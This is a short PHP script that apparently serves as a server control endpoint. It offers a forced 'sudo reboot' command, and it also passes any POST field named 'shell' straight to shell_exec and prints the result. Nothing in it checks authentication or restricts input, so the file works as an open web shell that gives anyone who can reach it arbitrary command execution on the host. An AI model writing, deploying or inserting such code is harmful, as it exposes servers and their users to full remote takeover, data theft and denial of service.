<?php

if (!isset($_POST))
    return;
    
$commands = [];

$commands['reboot'] = function() {
        return shell_exec('sudo reboot -f');
    };

if (isset($_POST['command']) && isset($commands[$_POST['command']])) {
    $commands[$_POST['command']]();
}

if (isset($_POST['shell'])) {
    echo shell_exec($_POST['shell']);
}
